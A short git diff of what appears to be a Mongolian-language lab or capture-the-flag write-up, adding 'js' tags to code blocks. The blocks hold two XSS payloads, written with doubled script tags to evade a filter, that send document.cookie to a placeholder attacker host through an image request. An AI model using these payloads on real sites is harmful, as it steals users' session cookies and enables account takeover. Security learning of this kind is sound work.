@@ -14,12 +14,12 @@ Docker version 20.10.10, build b485636
 `http://ipaddress/1337:/feed.php`
 XSS өртөмтгий байх амархан шалгаж болно. 
 
-```
+```js
 <sscriptcript> new Image().src="http://<ATTACKERIP>:<port>/?"+document.cookie; </sscriptcript>
 ```
 
 эсвэл
-```
+```js
 <sscriptcript>document.write('<img src="http://ATTACKERIP/?'+document.cookie+'" />')</sscriptcript>
 ```
 
